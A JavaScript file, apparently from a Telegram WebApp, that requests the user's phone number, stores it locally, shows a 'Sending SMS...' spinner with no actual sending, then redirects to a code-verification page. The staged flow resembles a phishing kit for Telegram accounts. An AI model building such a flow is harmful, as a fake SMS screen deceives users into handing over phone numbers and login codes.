// Функция запроса номера телефона через Telegram WebApp
function requestPhoneNumber() {
    // Запрашиваем номер через нативный диалог Telegram
    window.Telegram.WebApp.requestContact((contact) => {
        if (contact && contact.phone_number) {
            // Сохраняем номер
            localStorage.setItem('phoneNumber', contact.phone_number);
            
            // Показываем страницу загрузки
            showLoadingPage();
        } else {
            alert('❌ Не удалось получить номер телефона');
        }
    });
}

// Функция показа страницы загрузки
function showLoadingPage() {
    // Создаем страницу загрузки с нашим градиентом
    const loadingHTML = `
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1A1C2F 0%, #2D1B69 50%, #1A1C2F 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        ">
            <div style="
                text-align: center;
                color: white;
                font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            ">
                <div style="
                    width: 60px;
                    height: 60px;
                    border: 4px solid rgba(0, 240, 249, 0.3);
                    border-top: 4px solid #00F0F9;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 30px;
                "></div>
                <h2 style="font-size: 1.5rem; margin-bottom: 15px; font-weight: 300;">Отправляем SMS...</h2>
                <p style="font-size: 1rem; opacity: 0.8;">Пожалуйста, подождите</p>
            </div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
    
    document.body.insertAdjacentHTML('beforeend', loadingHTML);
    
    // Через 3 секунды переходим на страницу ввода кода
    setTimeout(() => {
        window.location.href = 'code-verification.html';
    }, 3000);
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});

// Инициализация Telegram WebApp
document.addEventListener('DOMContentLoaded', function() {
    if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});